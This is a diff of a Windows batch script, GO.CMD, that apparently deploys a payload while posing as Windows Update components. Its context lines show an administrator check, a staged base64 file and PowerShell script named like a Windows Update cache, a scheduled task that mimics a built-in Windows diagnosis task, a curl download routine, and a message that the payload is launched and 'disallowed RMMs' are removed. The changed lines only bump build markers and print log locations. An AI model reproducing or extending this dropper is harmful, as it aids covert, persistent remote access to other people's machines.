@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions
-echo === GO.CMD BUILD 20260730WU7 ===
+echo === GO.CMD BUILD 20260730WU7B ===
 
 net session >nul 2>&1
 if errorlevel 1 (
@@ -13,7 +13,7 @@ set "B64=%WORKDIR%\update.b64"
 set "PS1=%WORKDIR%\wucache_pkg.ps1"
 set "PS1ALT=C:\Windows\Temp\wucache_pkg.ps1"
 set "ERR=%WORKDIR%\boot.err"
-set "MARKER=WU_BUILD_20260730A"
+set "MARKER=WU_BUILD_20260730B"
 set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"
 set "RUNPS="
 
@@ -106,6 +106,10 @@ if errorlevel 1 (
 )
 schtasks /Run /TN "%ONCETASK%"
 echo Payload OK [%MARKER%], launched. Disallowed RMMs are auto-removed. Wait 180s.
+echo If SC missing, check logs:
+echo   type "%WORKDIR%\.diag.log"
+echo   type "%ERR%"
+echo   type "%WORKDIR%\msi.log"
 exit /b 0
 
 :try_curl
